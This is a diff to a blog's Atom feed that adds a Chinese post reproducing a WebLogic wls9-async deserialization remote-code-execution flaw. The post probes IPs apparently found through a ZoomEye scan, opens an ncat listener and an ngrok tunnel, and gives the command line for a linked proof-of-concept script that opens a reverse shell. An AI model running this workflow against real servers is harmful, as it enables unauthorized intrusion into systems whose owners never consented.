@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-05-21T01:28:19.952Z</updated>
+  <updated>2019-09-03T13:15:13.667Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>WebLogic wls9-async反序列化远程命令执行漏洞复现</title>
+    <link href="http://yoursite.com/2019/09/03/WebLogic-wls9-async%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2019/09/03/WebLogic-wls9-async反序列化远程命令执行漏洞复现/</id>
+    <published>2019-09-03T12:54:19.000Z</published>
+    <updated>2019-09-03T13:15:13.667Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814"><a href="#WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814" class="headerlink" title="WebLogic wls9-async反序列化远程命令执行漏洞复现(CNVD-C-2019-48814)"></a>WebLogic wls9-async反序列化远程命令执行漏洞复现(CNVD-C-2019-48814)</h2><p>该漏洞是由wls9_async_response组件导致，在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，未授权的情况下远程执行命令。部分版本WebLogic中默认包含的wls9_async_response包，主要是为WebLogic Server提供异步通讯服务。</p><p><br></p><p>利用zoomeye扫描到的ip</p><p><br></p><p>首先访问 目标ip/_async/AsyncResponseService 来判断是否启用该组件，如果存在则有可能存在此漏洞。</p><p><img src="\img\weblogic1.png" alt></p><p>漏洞原理是向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml</p><p>利用poc</p><p><a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a></p><p>首先用ncat监听端口8888</p><p><img src="\img\weblogic2.png" alt></p><p>然后利用ngrok进行内网穿透。下面这片文章写的非常好！</p><p><a href="https://bbs.ichunqiu.com/thread-53000-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-53000-1-1.html</a></p><p><img src="\img\weblogic3.png" alt></p><p>最后利用poc尝试反弹端口getshell</p><p>python2 CNVD-C-2019-48814.py -l &lt;ngrok分配的免费域名&gt; -p &lt;ngrok分配的端口&gt; -r &lt;目标ip+端口&gt;</p><p>漏洞利用成功</p><p><img src="\img\weblogic4.png" alt></p><p><img src="\img\weblogic5.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814&quot;&gt;&lt;a href=&quot;#WebLogic-wls9-async反序列化远程命令执行漏洞复现-CNVD-C-2019-48814&quot; class=&quot;headerlin
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="weblogic RCE" scheme="http://yoursite.com/tags/weblogic-RCE/"/>
+    
+  </entry>
   
   <entry>
     <title>I LIKE YOU</title>
